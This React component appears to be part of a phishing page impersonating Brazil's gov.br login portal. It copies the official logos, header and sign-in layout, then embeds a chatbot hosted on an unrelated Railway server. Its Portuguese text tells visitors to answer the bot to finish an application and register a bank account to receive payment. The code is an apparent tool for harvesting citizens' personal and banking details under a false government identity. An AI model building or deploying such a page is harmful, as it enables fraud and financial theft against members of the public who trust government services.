import { useEffect } from "react";

declare global {
  namespace JSX {
    interface IntrinsicElements {
      'typebot-standard': React.DetailedHTMLProps<React.HTMLAttributes<HTMLElement>, HTMLElement>;
    }
  }
}

export default function Chat() {
  useEffect(() => {
    // Carregar o script do Typebot
    const script = document.createElement("script");
    script.type = "module";
    script.src = "https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3/dist/web.js";
    
    script.onload = () => {
      // Criar o custom element typebot-standard
      const container = document.getElementById("typebot-container");
      if (container) {
        const typebotElement = document.createElement("typebot-standard");
        typebotElement.setAttribute("style", "width: 100%; height: 600px;");
        container.appendChild(typebotElement);
        
        // Inicializar o Typebot
        // @ts-ignore
        if (window.Typebot) {
          // @ts-ignore
          window.Typebot.initStandard({
            typebot: "my-typebot-o0z0uia",
            apiHost: "https://viewer-production-e969.up.railway.app",
          });
        }
      }
    };
    
    document.head.appendChild(script);

    return () => {
      // Cleanup
      if (document.head.contains(script)) {
        document.head.removeChild(script);
      }
    };
  }, []);

  return (
    <>
      <header>
        <a href="#">
          <img src="/images/govbr-new.png" alt="Logomarca GovBR" />
        </a>
        <div id="acessibilidade">
          <span>
            <a href="#">
              <i className="fa fa-adjust"></i>
              <span>Alto Contraste</span>
            </a>
          </span>
          <span>
            <a href="#">
              <i className="fa fa-deaf"></i>
              <span>VLibras</span>
            </a>
          </span>
        </div>
      </header>

      <div className="container">
        <aside id="aside-signin">
          <img
            id="identidade-govbr"
            src="/images/conta_govbr_v2.jpg"
            alt="Logomarca GovBR"
          />
        </aside>

        <main id="main-signin">
          <div className="card" id="login-cpf">
            <h3>Última Etapa - Confirmação via Chat</h3>
            <p style={{ marginBottom: "20px", fontSize: "14px" }}>
              <strong>Importante:</strong> Responda todas as perguntas do
              assistente para concluir sua candidatura e cadastrar sua conta bancária para recebimento.
            </p>

            <div
              id="typebot-container"
              style={{
                width: "100%",
                minHeight: "600px",
                height: "600px",
                display: "block",
                position: "relative",
              }}
            >
              {/* O Typebot será injetado aqui */}
            </div>
          </div>
        </main>
      </div>

      <footer></footer>
      
      <style>
        {`
          typebot-standard {
            display: block !important;
            width: 100% !important;
            height: 600px !important;
            min-height: 600px !important;
          }
          
          typebot-standard > * {
            display: block !important;
          }
        `}
      </style>
    </>
  );
}
